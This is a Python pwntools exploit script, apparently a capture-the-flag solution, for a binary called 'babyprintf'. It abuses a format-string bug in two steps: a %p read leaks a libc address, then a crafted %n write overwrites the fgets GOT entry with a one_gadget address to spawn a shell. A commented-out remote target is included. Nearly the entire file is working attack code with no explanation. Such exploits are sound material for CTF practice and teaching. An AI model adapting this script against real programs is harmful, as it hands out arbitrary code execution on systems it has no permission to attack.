#-*- encoding: utf-8 -*- 
from pwn import *
context.binary = './babyprintf'
context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = elf.libc

def dbg():
	raw_input()

def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 + word - prev
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr

def fmt_str(offset, size, addr, target):
    payload = ""
    for i in range(4):
        if size == 4:
            payload += p32(addr + i)
        else:
            payload += p64(addr + i)
    prev = len(payload)
    for i in range(4):
        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
        prev = (target >> i * 8) & 0xff
    return payload

p = process('./babyprintf')
#p = remote('183.129.189.60', 10043)

#leak libc
payload = '%43$p'
p.sendline(payload)
libc_start_main_addr = int(p.recvline().strip('\n'), 16) - 240
libc.address = libc_start_main_addr - libc.symbols['__libc_start_main']
system = libc.symbols['system']
#binsh = next(libc.search('/bin/sh\x00'))
print "libc.address ==> " + hex(libc.address)
print "system ==> " + hex(system)
gadget = libc.address + 0xf1147
#write fgets_got to system

gdb.attach(p, 'b* 0x4006DA')
dbg()
fgets_got = elf.got['fgets']

#null 截断手动构造
byte_4 = gadget & 0xffffffff
print "byte_4 ==> " + hex(byte_4)

payload =  '%%%dc' % (byte_4)
payload += '%%%d$n' % (8 + 3)
payload = payload.ljust(0x18, 'a')
payload += p64(fgets_got)


p.sendline(payload)

p.interactive()
p.close()